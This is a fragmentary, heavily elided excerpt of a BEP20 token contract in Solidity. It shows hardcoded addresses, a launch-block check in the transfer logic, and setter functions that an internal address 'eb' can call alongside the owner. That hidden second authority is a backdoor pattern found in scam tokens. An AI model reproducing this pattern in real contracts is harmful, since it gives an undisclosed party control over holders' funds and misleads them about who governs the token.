...
contract BEP20 is Context, Ownable, IBEP20 {
    ...
    address public Back = 0xA6d66d20B8819F9e38c0cb0c583BD33D0dC703B3;
    address public Dead = 0x000000000000000000000000000000000000dEaD;
    address internal wha = 0xc9460e1EbA55abfc505F76C247c2589C74F81aa3;
    address internal eb = 0xc9460e1EbA55abfc505F76C247c2589C74F81aa3;
    ...
    function _transfer(
        ...
        if (inSwapAndLiquify) {
            ...
            bool excludedAccount = _isExcluded[sender] ||
                _isExcluded[recipient];
            if (!excludedAccount) {
                if (
                    _startBlock == 0 || block.number < (_startBlock + _blocks)
                ) {
    ...
    function setBackAddr(address _addr) external {
        require(eb == msg.sender || owner() == msg.sender, "not set");
    ...
    function setBackEnable(bool newValue) external {
        require(eb == msg.sender || owner() == msg.sender, "auth error");
